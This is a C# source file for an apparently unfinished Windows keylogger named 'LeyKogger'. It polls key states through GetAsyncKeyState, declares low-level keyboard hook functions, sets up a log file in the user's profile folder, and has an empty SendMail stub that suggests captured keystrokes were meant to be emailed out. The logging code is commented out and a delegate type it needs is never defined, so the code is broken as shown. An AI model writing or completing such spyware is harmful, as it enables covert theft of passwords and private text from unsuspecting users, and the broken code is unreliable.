using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace LeyKogger
{
    static class Program
    {
        private static string path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\log.txt");
        private static bool[] keyboardState = new bool[256];

        private static void Initiate()
        {

        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private static void ReadKeyboard(char[] keys)
        {
            for (int x = 0; x < 256; x++)
                keys[x] = (char)(GetAsyncKeyState(x) >> 8);
        }

        static void Main()
        {
            string buf = "";
            int state = 0;
            int nextState = 0;

            while (true)
            {
                Thread.Sleep(75);
                for (short i = 0; i < 256; i++)
                {

                    /*state = GetAsyncKeyState(i);                    
                    if (state != 0 && state != nextState)
                    {
                        //buf += ((Keys)i).ToString();
                        buf += (char)(state >> 8);
                        if (buf.Length > 10)
                        {
                            File.AppendAllText(path, buf);
                            buf = "";                            
                        }
                        //nextState = state;
                        state = 0;
                    }   */
                }
            }
        }

        private static void SendMail()
        {

        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
